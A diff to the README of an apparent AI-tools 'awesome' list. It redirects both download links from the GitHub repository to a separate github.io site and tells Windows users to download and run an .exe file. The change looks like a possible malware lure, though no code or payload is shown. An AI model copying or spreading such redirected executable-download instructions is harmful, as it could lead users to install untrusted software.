@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-native - Find the best artificial intelligence tools
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Xenond8661/awesome-ai-native)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://xenond8661.github.io)
 
 ## 📌 What is this?
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 Follow these steps to access the software:
 
-1. Visit the [official download page](https://github.com/Xenond8661/awesome-ai-native).
+1. Visit the [official download page](https://xenond8661.github.io).
 2. Look for the releases section on the right side of the screen.
 3. Select the latest version available.
 4. Click the file ending in .exe to begin your download.
